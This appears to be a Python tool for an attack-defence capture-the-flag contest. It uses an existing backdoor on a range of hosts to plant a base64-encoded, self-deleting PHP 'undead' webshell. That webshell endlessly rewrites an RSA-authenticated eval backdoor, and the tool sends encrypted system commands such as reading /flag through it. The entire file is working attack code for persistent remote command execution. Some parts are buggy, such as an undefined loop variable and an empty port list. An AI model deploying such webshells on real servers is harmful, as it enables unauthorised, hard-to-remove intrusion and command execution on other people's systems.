# coding=gbk
import requests
import base64


def no_die(url, ports, shell, passwd):
    ips = open("keep_continue_ip_list.txt", "w")
    data = {passwd: "file_put_contents(\".config.php\",base64_decode(\"" + php + "\"));"}
    for port in ports:
        try:
            url1 = "http://" + url + ":" + str(port) + shell
            print(url1)
            attack = requests.post(url=url1, data=data, timeout=1)
            if attack.status_code == 200:
                url1 = "http://"+url + "."+ str(port) +"/.config.php"
                try:
                    requests.get(url=url1,timeout=0.1)
                except:
                    pass
                url1 = "http://"+url + "."+ str(i) +"/.config.php"
                active = requests.get(url=url1,timeout=1)
                if(active.status_code==200):
                    ips.write(url+"."+str(i)+"----"+"success")
                    ips.write("\n")
                else:
                    print("sorry the file is not exist!")
        except:
            print(url1+"-----error")
#no_die("192.168.0.2","192.168.0.254","/backdoor.php","c")
#生成的不死马地址为http://x.x.x.x/.config.php
def use_rsa():
    url = "http://127.0.0.1/rsa_client.php"
    payload = "system('cat /flag');" #此处的payload可以任意更改
    res = requests.post(url=url, data={"a": payload, "action": "enc"})
    enc = res.content
    print(res.text)
    url1 = "http://127.0.0.1/.rsa_server.php" #此处为不死马循环写入的RSA服务端，用来返回flag
    payload1 = enc
    res1 = requests.post(url=url1, data={"cmd": payload1})

if __name__ == '__main__':
    '''
        filename = "no_die.php"
        f = open(filename, 'r')
        php = f.read()
        php = base64.b64encode(php.encode("ascii"))
        php = php.decode("ascii")
        '''

    url = "http://10.12.153.73"
    ports = []

    php = 'PD9waHAKICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgaWdub3JlX3VzZXJfYWJvcnQoMSk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJHNoZWxsPSc8P3BocApjbGFzcyBSc2Ege3ByaXZhdGUgc3RhdGljICRQVUJMSUNfS0VZPSAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDckZ4eUFZR3FERTlPUjNDTlBFakdwUURBYwpJY3NjOVpHLzJIUGd6SHNNRThuNDV4MXlQNzVLaTBNSVlqNHVob3lnb1lsblpQazNnS2o2MEdkTThvRDdodkw2ClIyNExaaWoweml4UnorbUJVL3hhYytkSkhJSy81eEFNdG5RZXlXY3UrUU1TTEFyRGxuOVd4cDdubU9OQTFSeTUKNGlYNGlKMVBWT0R0dy9CWmJRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiOwogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZ2V0UHVibGljS2V5KCkKICAgIHsKICAgICAgICAkcHVibGljS2V5ID0gc2VsZjo6JFBVQkxJQ19LRVk7CiAgICAgICAgcmV0dXJuIG9wZW5zc2xfcGtleV9nZXRfcHVibGljKCRwdWJsaWNLZXkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcHVibGljRGVjcnlwdCgkZW5jcnlwdGVkID0gIiIpCiAgICB7CiAgICAgICAgaWYgKCFpc19zdHJpbmcoJGVuY3J5cHRlZCkpIHsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgICAgIHJldHVybiAob3BlbnNzbF9wdWJsaWNfZGVjcnlwdChiYXNlNjRfZGVjb2RlKCRlbmNyeXB0ZWQpLCAkZGVjcnlwdGVkLCBzZWxmOjpnZXRQdWJsaWNLZXkoKSkpID8gJGRlY3J5cHRlZCA6IG51bGw7CiAgICB9Cn0KJGNtZD0kX1BPU1RbYV07CiRyc2EgPSBuZXcgUnNhKCk7CiRwdWJsaWNEZWNyeXB0ID0gJHJzYS0+cHVibGljRGVjcnlwdCgkY21kKTsKJHJlcz1ldmFsKCRwdWJsaWNEZWNyeXB0KTsnCiAgICA7CiAgICB3aGlsZSgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcucnNhX3NlcnZlci5waHAnLCRzaGVsbCk7CiAgICBzeXN0ZW0oJ2NobW9kIDc3NyAucnNhX3NlcnZlci5waHAnKTsKICAgIH0KPz4='
    shell = "/.server.php?pass=e0!}W93q2eurUS87edehjd9dl;[po2e"
    passwd = "a"
    catflag = {
        passwd: 'system(\'' + php + '\');'
    }
    use_rsa()
    # no_die(url, ports, shell, passwd)
    # print(res1.content)

